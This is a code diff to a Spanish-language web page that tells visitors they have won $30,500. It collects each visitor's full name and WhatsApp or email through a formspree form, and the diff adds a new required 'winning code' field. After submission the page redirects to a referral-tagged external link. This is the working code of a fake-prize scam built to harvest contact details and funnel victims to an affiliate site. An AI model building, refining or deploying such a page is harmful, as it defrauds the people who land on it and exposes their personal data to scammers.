@@ -31,12 +31,13 @@
     <h2>¡Felicidades!</h2>
     <p class="prize-text">
       ¡GANASTE $30,500!<br>
-      Completa el formulario para reclamar tu premio.
+      Completa los 3 campos para reclamar tu premio.
     </p>
 
     <form id="claimForm" action="https://formspree.io/f/xzdrqyke" method="POST">
       <input type="text" name="nombre" placeholder="Nombre Completo" required>
       <input type="text" name="contacto" placeholder="WhatsApp o Email" required>
+      <input type="text" name="codigo_ganancia" placeholder="Código de Ganancia" required>
       <input type="hidden" name="premio" value="Ganaste $30,500">
 
       <button type="submit" id="submitBtn">Reclamar Premio</button>
@@ -47,10 +48,10 @@
 
   <script src="script.js"></script>
 
-  <!-- Form submission with redirect to your new link -->
+  <!-- Form submission handler with redirect -->
   <script>
     document.getElementById('claimForm').addEventListener('submit', function(event) {
-      event.preventDefault(); // Prevent page reload
+      event.preventDefault();
 
       const form = event.target;
       const submitBtn = document.getElementById('submitBtn');
@@ -68,17 +69,17 @@
       })
       .then(response => {
         if (response.ok) {
-          // Success: redirect to the new link
+          // Redirect after success
           window.location.href = "https://www.latgree.com/?user=27977&ref=44947";
         } else {
-          alert("Error al enviar. Por favor, intenta de nuevo.");
+          alert("Error al enviar el formulario. Inténtalo de nuevo.");
           submitBtn.disabled = false;
           submitBtn.textContent = "Reclamar Premio";
         }
       })
       .catch(error => {
         console.error('Error:', error);
-        alert("Problema de conexión. Verifica tu internet e intenta otra vez.");
+        alert("Problema de conexión. Verifica tu internet.");
         submitBtn.disabled = false;
         submitBtn.textContent = "Reclamar Premio";
       });
